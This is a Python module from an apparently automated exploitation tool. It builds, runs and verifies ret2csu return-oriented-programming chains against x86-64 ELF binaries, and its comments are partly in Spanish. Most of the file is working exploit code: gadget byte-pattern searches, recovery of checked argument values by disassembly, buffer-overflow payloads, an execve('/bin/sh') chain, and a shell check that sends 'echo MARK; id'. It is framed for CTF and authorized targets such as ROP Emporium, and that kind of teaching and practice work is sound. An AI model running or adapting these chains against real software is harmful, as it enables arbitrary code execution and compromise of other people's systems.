"""ret2csu verified by execution: control rdi/rsi/rdx and make a call with the universal gadgets.

The two `__libc_csu_init`-style gadgets let you set the first three argument registers and perform an
indirect call WITHOUT any `pop rsi`/`pop rdx` gadget -- the classic way to call a function with
controlled arguments in a gadget-poor x86-64 binary:

    gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    gadget2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

Set rbx=0, rbp=1 (so the csu loop runs once and stops), r12=&(pointer to the target function),
r13=arg1 (edi, 32-bit), r14=arg2 (rsi), r15=arg3 (rdx); gadget2 then calls target(arg1,arg2,arg3).
binoracle builds this and VERIFIES it by execution -- a real shell in the sandbox. The gadgets are
located by byte-pattern search (independent of symbol names). For AUTHORIZED / CTF targets.

Strategy C (generic, added after testing against a real CTF binary -- ROP Emporium's own
`ret2csu` challenge, not one of this project's synthetic fixtures) drops the `win`+`fnptr`/
`retptr` symbol requirement entirely: those names only ever exist in binoracle's OWN practice
sample (invented specifically to demonstrate the primitive), never in a real-world binary. The
real challenge has no such symbols, yet is a textbook ret2csu target -- a gadget-poor binary
that calls `ret2win(rdi, rsi, rdx)` with three EXACT 64-bit values the function checks via
`cmp`. Strategy C generalizes both halves of that gap:
  1. `r12` (the csu call's indirect-call pointer) no longer needs to point at a named global --
     any already-valid, ALREADY-DEREFERENCEABLE pointer works, as long as what it points to is
     safe to call with garbage register state. `DT_FINI`'s own `d_un` field (an Elf64_Dyn entry
     inside `.dynamic`, always present in a dynamically-linked ELF) is exactly that: it already
     holds a pointer to the binary's `_fini` stub, which the CRT always makes a harmless
     `sub rsp,8; add rsp,8; ret` when there's nothing registered in `.fini_array` -- it ignores
     whatever's in rdi/rsi/rdx and just returns. This is the SAME technique ROP Emporium's own
     published solve.py uses (confirmed byte-for-byte: `0x600E48`/`0x4006B4` in the real binary
     match this code's own DT_FINI-address computation and value exactly).
  2. the real target function is found by NAME (the same gift-keyword heuristic `autopoc.py`
     already uses for ret2win, reused here instead of reinvented) among BOTH locally-defined
     symbols and PLT-imported ones -- the real challenge's `ret2win` lives in a *separate*
     shared library (`libret2csu.so`), reached through the main binary's PLT, exactly like any
     other imported libc function. Its expected argument VALUES are recovered by disassembling
     its own prologue with capstone: map each `mov [rbp-N], <argreg>` to a stack slot, then find
     the `movabs <reg>, imm64` + `cmp [rbp-N], <reg>` pair that checks that slot -- the exact
     pattern `ret2win()` uses for all three args (confirmed live: this recovers
     0xdeadbeefdeadbeef/0xcafebabecafebabe/0xd00df00dd00df00d from the real `.so`, byte for
     byte, with ZERO hardcoded knowledge of the challenge). Falls back to small sentinel values
     when no such check is found (a `win()`-style target that doesn't validate its args, same
     as strategy A already assumed).
  3. `edi` (gadget2's `mov edi, r13d`) only ever gives you the LOWER 32 bits of a 64-bit rdi --
     invisible on binoracle's own fixture (whose sentinels fit in 32 bits by design) but fatal
     against the real challenge, whose first argument is a full 64-bit constant. Strategy C
     corrects this with a trailing `pop rdi; ret` (present in this real binary, and common in
     non-gadget-poor-for-rdi binaries -- ret2csu is normally reached for rsi/rdx specifically,
     not rdi) right before the final jump to the target, after the csu tail's own 7-qword
     epilogue (`add rsp,8` + 6 register pops) runs out.
Verified live end to end against the real `ret2csu` binary: offset=40 (the correct one) returns
the real flag `ROPE{Un1v3rs4l_R0P_w1th_ret2csu}`; offsets 32/48/56 (deliberately wrong) return no
flag -- no false positive."""
from __future__ import annotations

from ._sandbox import run_driver

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    _HAVE_ELFTOOLS = False

# Mismo criterio de "nombre de funcion regalo" que ya usa autopoc.find_win (delimitado, no
# substring suelto) -- reutilizado, no reinventado, para que 'ret2win' tambien cuente aqui.
from .autopoc import _GIFT_RE

_DRIVER = r'''
import sys, time, re
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
# strategy C params, passed by the host (static analysis, no sandbox needed for THIS part):
# sys.argv[2]=target symbol name ("" if none found), [3:6]=hex rdi/rsi/rdx values.
_C_NAME = sys.argv[2] if len(sys.argv) > 2 else ""
_C_ARGS = [int(x, 16) for x in sys.argv[3:6]] if len(sys.argv) > 5 else [0, 0, 0]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (ret2csu driver is x86-64)"); sys.exit(1)

def find(seq):
    return next(elf.search(seq), None)

# gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
G1 = find(bytes([0x5b,0x5d,0x41,0x5c,0x41,0x5d,0x41,0x5e,0x41,0x5f,0xc3]))
# gadget2 core: mov rdx,r15; mov rsi,r14; mov edi,r13d  (4c89fa 4c89f6 4489ef)
G2 = find(bytes([0x4c,0x89,0xfa,0x4c,0x89,0xf6,0x44,0x89,0xef]))
RET = find(bytes([0xc3]))        # a bare `ret` for 16-byte stack re-alignment (MOVAPS in glibc)
if G1 is None or G2 is None or RET is None:
    print("NOT_APPLICABLE (no __libc_csu_init-style gadgets found)"); sys.exit(1)

MARK = b"BINORACLE_CSU_PWNED"
_OFFS = [72, 64, 88, 56, 96, 80, 104, 120, 40, 48]
# misma brecha real encontrada y cerrada esta noche en autopoc.py: muchos retos CTF reales
# (toda la serie de ROP Emporium incluida) no abren shell -- su gift function solo imprime la
# flag directamente (puts + exit). Sin esto, un ret2csu REAL verificado se reportaba como no
# verificado porque run() solo miraba MARK/uid=.
_FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}")

def run(payload):
    # el try/except interno de cada paso es a proposito, no cosmetico: un target que NO abre
    # shell (como el ret2win real de ROP Emporium -- imprime la flag y llama exit() el mismo)
    # tumba el proceso justo despues del payload, asi que el io.sendline() de comprobacion de
    # shell siguiente lanza EOFError -- un solo try/except envolviendolo TODO (como tenia esta
    # funcion antes de este cambio) descartaba tambien la salida YA capturada (la flag incluida)
    # en cuanto eso pasaba, reportando no-verificado aunque el exploit si hubiera funcionado.
    io, out = None, b""
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(payload); time.sleep(0.3)
        try: out += io.recvrepeat(0.3)
        except Exception: pass
        try:
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out += io.recvrepeat(1.2)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            if io: io.close()
        except Exception: pass
    shelled = (MARK in out) or (b"uid=" in out)
    fm = _FLAG_RE.search(out.decode("latin1", "replace"))
    if shelled:
        return "shell", None
    if fm:
        return "flag", fm.group(0)
    return None, None

# --- strategy A: csu gadget2 calls a function pointer (fnptr) with 3 controlled args (win(a,b,c)) --
win = elf.symbols.get("win")
fnptr = elf.symbols.get("fnptr")
if fnptr is not None and win is not None:
    A1, A2, A3 = 0x1337, 0xdead, 0xbeef          # sentinels the practice win() checks
    def chain_win(align):
        c  = p64(RET) * align
        c += p64(G1) + p64(0) + p64(1) + p64(fnptr) + p64(A1) + p64(A2) + p64(A3)
        c += p64(G2) + p64(G1) + p64(0) * 6
        return c
    for off in _OFFS:
        for align in (0, 1):
            kind, extra = run(b"A" * off + chain_win(align))
            if kind:
                print("VERIFIED mode=win off=%d align=%d g1=%#x g2=%#x fnptr=%#x" % (off, align, G1, G2, fnptr))
                sys.exit(0)

# --- strategy B: ret2csu -> execve. Use csu to set rsi=0 / rdx=0 (no pop rsi/rdx), with gadget2's
# forced call aimed at a benign `ret` pointer, then pop rdi=&binsh, pop rax=59, syscall. ----------
binsh = next(elf.search(b"/bin/sh\x00"), None)
rop = ROP(elf)
try: pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
except Exception: pop_rdi = None
try: pop_rax = rop.find_gadget(["pop rax", "ret"]).address
except Exception: pop_rax = None
_sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
syscall = _sc.address if _sc else None
# a pointer whose target just returns: the 'retptr' symbol, else build one is not possible here.
benign_ptr = elf.symbols.get("retptr")
if binsh and pop_rdi and pop_rax and syscall and benign_ptr is not None:
    def chain_execve():
        c  = p64(G1) + p64(0) + p64(1) + p64(benign_ptr) + p64(0) + p64(0) + p64(0)  # rsi=0, rdx=0
        c += p64(G2)                                   # sets rsi/rdx, benign call, returns
        c += p64(pop_rdi) + p64(binsh) + p64(pop_rax) + p64(59) + p64(syscall)       # execve('/bin/sh',0,0)
        return c
    for off in _OFFS:
        kind, extra = run(b"A" * off + chain_execve())
        if kind:
            print("VERIFIED mode=execve off=%d g1=%#x g2=%#x syscall=%#x binsh=%#x" % (off, G1, G2, syscall, binsh))
            sys.exit(0)

# --- strategy C: generic ret2csu against a REAL target, no fnptr/retptr symbol needed. See the
# module docstring for why each piece (DT_FINI as benign call pointer, name-based target lookup,
# full-rdi correction via a trailing pop rdi) is there -- confirmed live against ROP Emporium's
# real ret2csu challenge (its ret2win() lives in a *separate* .so, reached via this binary's own
# PLT, exactly like elf.plt.get() below resolves it). -----------------------------------------
if _C_NAME:
    target_c = elf.plt.get(_C_NAME) or elf.symbols.get(_C_NAME)
    try: pop_rdi_c = pop_rdi or rop.find_gadget(["pop rdi", "ret"]).address
    except Exception: pop_rdi_c = None
    benign_c = None
    try:
        from elftools.elf.elffile import ELFFile as _EF
        with open(name, "rb") as _f:
            _dynsec = _EF(_f).get_section_by_name(".dynamic")
            if _dynsec is not None:
                _base = _dynsec["sh_addr"]
                for _i, _tag in enumerate(_dynsec.iter_tags()):
                    if _tag.entry.d_tag == "DT_FINI":
                        benign_c = _base + _i * 16 + 8
                        break
    except Exception:
        benign_c = None
    if target_c and pop_rdi_c and benign_c:
        A1c, A2c, A3c = _C_ARGS
        def chain_generic(align):
            c  = p64(RET) * align
            c += p64(G1) + p64(0) + p64(1) + p64(benign_c) + p64(A1c & 0xFFFFFFFF) + p64(A2c) + p64(A3c)
            c += p64(G2)
            c += p64(0) * 7            # csu tail epilogue: 'add rsp,8' (skip) + 6 register pops
            c += p64(pop_rdi_c) + p64(A1c)   # gadget2's `mov edi,r13d` only gives the low 32 bits
            c += p64(target_c)
            return c
        for off in _OFFS:
            for align in (0, 1):
                kind, extra = run(b"A" * off + chain_generic(align))
                if kind == "flag":
                    print("VERIFIED mode=generic off=%d align=%d target=%#x g1=%#x g2=%#x flag=%s" %
                          (off, align, target_c, G1, G2, extra))
                    sys.exit(0)
                if kind == "shell":
                    print("VERIFIED mode=generic off=%d align=%d target=%#x g1=%#x g2=%#x" %
                          (off, align, target_c, G1, G2))
                    sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


_ARGREGS64 = ("rdi", "rsi", "rdx", "rcx", "r8", "r9")


def _exec_sections(elf) -> list:
    out = []
    for sec in elf.iter_sections():
        try:
            if sec["sh_flags"] & 0x4 and sec["sh_addr"]:
                out.append((sec["sh_addr"], sec.data()))
        except Exception:
            continue
    return out


def _find_gift_symbol(binary: str):
    """Busca, de forma barata (solo pyelftools, sin sandbox), un nombre de funcion 'regalo'
    (misma heuristica que autopoc.find_win, via `_GIFT_RE`) entre los simbolos definidos
    LOCALMENTE en `binary` o, si no hay ninguno, importados desde una shared lib enlazada
    (DT_NEEDED) que este junto a `binary` en su mismo directorio -- el patron real del
    ret2csu de ROP Emporium, donde `ret2win` vive en `libret2csu.so`, no en el ejecutable.
    Devuelve (nombre, ruta_a_la_lib_o_None) o (None, None)."""
    if not _HAVE_ELFTOOLS:
        return None, None
    import os
    try:
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            needed = []
            dynsec = elf.get_section_by_name(".dynamic")
            if dynsec is not None:
                for tag in dynsec.iter_tags():
                    if tag.entry.d_tag == "DT_NEEDED":
                        needed.append(tag.needed)
            local, undefined = [], []
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if not sec:
                    continue
                for s in sec.iter_symbols():
                    if not s.name or not _GIFT_RE.search(s.name.lower()):
                        continue
                    if s["st_info"]["type"] != "STT_FUNC":
                        continue
                    (local if (s["st_shndx"] != "SHN_UNDEF" and s["st_value"]) else undefined).append(s.name)
    except Exception:
        return None, None
    if local:
        return local[0], None
    if not undefined:
        return None, None
    d = os.path.dirname(os.path.abspath(binary))
    for libname in needed:
        p = os.path.join(d, libname)
        if not os.path.isfile(p):
            continue
        try:
            with open(p, "rb") as f:
                libelf = ELFFile(f)
                for secname in (".symtab", ".dynsym"):
                    sec = libelf.get_section_by_name(secname)
                    if not sec:
                        continue
                    for s in sec.iter_symbols():
                        if s.name in undefined and s["st_shndx"] != "SHN_UNDEF" and s["st_value"]:
                            return s.name, p
        except Exception:
            continue
    return None, None


def _symbol_addr(path: str, name: str):
    try:
        with open(path, "rb") as f:
            elf = ELFFile(f)
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if not sec:
                    continue
                for s in sec.iter_symbols():
                    if s.name == name and s["st_value"]:
                        return s["st_value"]
    except Exception:
        pass
    return None


def _infer_fixed_args(path: str, func_addr: int, window: int = 0x300, size: int = 0) -> dict:
    """Desensambla el cuerpo de la funcion en `func_addr` (dentro del ELF en `path`, que puede
    ser el binario principal o una shared lib enlazada) y recupera, por patron, los valores
    EXACTOS de argumento contra los que compara cada registro: `mov [rbp-N], <argreg>` mapea un
    hueco de pila a su registro de origen; `movabs <reg>, imm64` seguido de `cmp [rbp-N], <reg>`
    da el valor esperado en ese hueco. Confirmado en vivo contra el ret2win real de ROP
    Emporium's ret2csu (vive en libret2csu.so): recupera los 3 valores exactos
    (0xdeadbeefdeadbeef / 0xcafebabecafebabe / 0xd00df00dd00df00d) byte a byte, sin ningun
    conocimiento previo del reto. Devuelve {} si no hay patron de comparacion (un win() que no
    valida argumentos) -- el llamador cae entonces a sentinelas pequenas.

    `size` (st_size del simbolo, si se conoce) ACOTA la ventana de desensamblado al cuerpo real
    de la funcion -- real bug encontrado reusando esto para escanear TODAS las funciones de un
    binario (autocallme.py): sin acotar, una funcion diminuta de la CRT (p.ej. `frame_dummy`,
    pocos bytes) seguida de cerca por otra que SI valida argumentos (p.ej. `callme_one`) hacia
    que el desensamblado, al no parar en el `ret` de la primera, siguiera linealmente dentro de
    la segunda y le atribuyera FALSAMENTE sus valores -- 4 falsos positivos confirmados en vivo
    (deregister_tm_clones/register_tm_clones/__do_global_dtors_aux/frame_dummy, los 4 "viendo"
    los mismos 3 valores de `callme_one`, que esta a solo 10 bytes de `frame_dummy`)."""
    if size:
        window = min(window, size)
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_OP_REG, CS_OP_MEM, CS_OP_IMM  # type: ignore
    except Exception:
        return {}
    try:
        with open(path, "rb") as f:
            elf = ELFFile(f)
            secs = _exec_sections(elf)
    except Exception:
        return {}
    blob = None
    for base, data in secs:
        if base <= func_addr < base + len(data):
            blob = data[func_addr - base: func_addr - base + window]
            break
    if not blob:
        return {}
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True
    slot_to_reg: dict = {}
    reg_to_val: dict = {}
    slot_to_val: dict = {}
    try:
        for insn in md.disasm(blob, func_addr):
            if len(insn.operands) != 2:
                continue
            a, b = insn.operands
            if insn.mnemonic == "mov" and a.type == CS_OP_MEM and b.type == CS_OP_REG:
                regname = insn.reg_name(b.reg)
                if regname in _ARGREGS64 and insn.reg_name(a.mem.base) == "rbp":
                    slot_to_reg.setdefault(a.mem.disp, regname)
            elif insn.mnemonic == "movabs" and a.type == CS_OP_REG and b.type == CS_OP_IMM:
                reg_to_val[insn.reg_name(a.reg)] = b.imm & 0xFFFFFFFFFFFFFFFF
            elif insn.mnemonic == "cmp" and a.type == CS_OP_MEM and b.type == CS_OP_REG:
                if insn.reg_name(a.mem.base) == "rbp":
                    regname = insn.reg_name(b.reg)
                    if a.mem.disp in slot_to_reg and regname in reg_to_val:
                        slot_to_val.setdefault(a.mem.disp, reg_to_val[regname])
    except Exception:
        return {}
    return {reg: slot_to_val[slot] for slot, reg in slot_to_reg.items() if slot in slot_to_val}


def _strategy_c_args(binary: str):
    """Resuelve, en el proceso principal (estatico, sin sandbox), lo que la strategy C del
    driver necesita: el nombre del target y sus 3 valores de argumento (exactos si se pudieron
    recuperar por desensamblado, sentinelas pequenas si no). Devuelve None si no hay ningun
    candidato 'regalo' -- strategy C se omite entonces, igual que A/B cuando faltan sus simbolos."""
    name, libpath = _find_gift_symbol(binary)
    if not name:
        return None
    addr = _symbol_addr(libpath or binary, name)
    vals = _infer_fixed_args(libpath or binary, addr) if addr else {}
    a1 = vals.get("rdi", 0x1337)
    a2 = vals.get("rsi", 0xdead)
    a3 = vals.get("rdx", 0xbeef)
    return name, a1, a2, a3


def _csu_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): strategy A necesita 'win' y 'fnptr'; strategy B necesita
    'retptr'; strategy C (generica, ver docstring del modulo) necesita cualquier nombre 'regalo'
    reconocible (local o importado de una shared lib enlazada) -- el gadget1/gadget2
    __libc_csu_init-style y los demas gadgets de las strategies A/B/C se buscan por patron de
    bytes / ROP dentro del driver, donde ya hay pwntools cargado -- aqui solo se filtra lo que
    es barato de saber de antemano, igual que el resto de _xxx_applicable de este motor."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        if ("win" in names and "fnptr" in names) or "retptr" in names:
            return True
    except Exception:
        return True
    return _find_gift_symbol(binary)[0] is not None


def autocsu(binary: str) -> dict:
    """ret2csu execve/call-win/generico verificado por ejecucion. Necesita los 2 gadgets
    universales y, segun la estrategia, un puntero a funcion conocido (`fnptr`/`retptr`, para
    el fixture sintetico de este proyecto) o cualquier funcion 'regalo' nombrada -- local o
    importada de una shared lib enlazada (`ret2win`, `win`... para un binario real; ver strategy
    C en el docstring del modulo). Docker o sandbox nativo; degrada limpio."""
    if not _csu_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin win+fnptr/retptr ni una funcion 'regalo' reconocible)"}
    c_args = _strategy_c_args(binary)
    args = [c_args[0], hex(c_args[1]), hex(c_args[2]), hex(c_args[3])] if c_args else ["", "0x0", "0x0", "0x0"]
    res = run_driver(binary, _DRIVER, ".binoracle_csu.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"ret2csu (__libc_csu_init): args controlados + call, shell/flag verificada ({eng})"
                   if res.get("verified")
                   else f"ret2csu: no verificado ({eng}) (sin gadgets csu / puntero de funcion / timing)")
    return res


def render_csu(r: dict) -> str:
    out = ["## Auto ret2csu (gadgets universales, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
